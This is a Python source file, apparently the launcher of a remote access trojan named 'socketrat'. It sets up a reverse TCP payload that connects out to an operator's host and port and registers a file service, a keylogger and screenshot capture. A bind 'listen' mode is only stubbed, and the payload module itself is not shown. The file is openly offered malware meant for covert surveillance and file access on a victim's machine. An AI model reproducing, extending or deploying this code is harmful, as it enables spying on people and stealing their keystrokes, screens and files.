# -*- coding: utf-8 -*-

import argparse
import platform

from . import payload


def _linux_connect(args):
    host, port = addr = args.host, args.port

    with payload.TCPReversePayload(addr) as p:
        p.register_file_service()
        p.register_keylogger()
        p.register_screenshot()
        p.connect_forever()


def _linux_listen(args):
    print(args)
    print('listening')


def _windows_main(args):
    raise NotImplementedError


def _linux_main(args):
    parser = argparse.ArgumentParser(
            prog='socketrat.payload',
            prefix_chars='-+',
    )
    payload_group = parser.add_argument_group('payload arguments')
    payload_group.add_argument('+kl',
            help='Turn on keylogger',
            action='store_true',
    )

    subparsers = parser.add_subparsers(
            dest='command',
            help='Choose from the following commands:',
            metavar='command',
    )
    subparsers.required = True

    connect_parser = subparsers.add_parser('connect',
            help='Connect to a socketrat server [reverse payload]'
    )
    connect_parser.set_defaults(func=_linux_connect)
    connect_parser.add_argument('host',
            help='Specify alternate hostname or IP address '
                 '[default: localhost]',
            default='localhost',
            nargs='?',
    )
    connect_parser.add_argument('port',
            help='Specify alternate port [default: 8000]',
            default=8000,
            nargs='?',
    )

    listen_parser = subparsers.add_parser('listen',
            help='Listen for connections from a socketrat server [bind payload]',
    )
    listen_parser.set_defaults(func=_linux_listen)
    listen_parser.add_argument('--bind', '-b',
            help='Specify alternate bind address [default: all interfaces]',
            metavar='ADDRESS',
            default='0.0.0.0',
    )
    listen_parser.add_argument('port',
            help='Specify alternate port [default: 8000]',
            default=8000,
            nargs='?',
    )

    args = parser.parse_args(args)
    args.func(args)


if platform.system() == 'Windows':
    main = _windows_main
elif platform.system() == 'Linux':
    main = _linux_main
else:
    def main(*args, **kwargs):
        raise NotImplementedError


if __name__ == '__main__':
    import sys

    args = sys.argv[1:]
    try:
        main(args)
    except NotImplementedError:
        print('*** Platform not supported: {}'.format(platform.system()))

